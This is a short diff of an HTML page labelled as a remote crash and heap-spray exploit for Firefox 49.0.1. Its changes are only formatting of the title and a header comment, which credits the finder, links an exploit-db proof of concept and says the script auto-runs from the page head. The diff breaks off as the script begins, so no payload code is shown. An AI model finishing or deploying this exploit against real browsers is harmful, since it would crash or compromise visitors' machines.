@@ -1,17 +1,13 @@
 <html><head>
-<title>Firefox 49.0.1 - Browser Remote Crash Exploit (HeapSpray)</title>
+<title>Firefox 49.0.1 - Browser Remote Crash Exploit (Heap-Spray)</title>
 
-<!--
----------------------------------------------
+<!-- 
 Firefox 49.0.1 - Browser Remote Crash Exploit
----------------------------------------------
-Credits  : sultan albalawi [vuln discover]
+Credits  : sultan albalawi
 POC      : https://www.exploit-db.com/exploits/40536/
-
 HeapSpray: Taken from Empire stager by: Chaitanya Haritash
-For javascript auto-execution, we need to place it inside <head> </head> tags
+For javascript auto-execution, we need to place it inside <head> </head> tags 
 -->
-
 
 <script type="text/javascript">
 var ref = (function ex() {
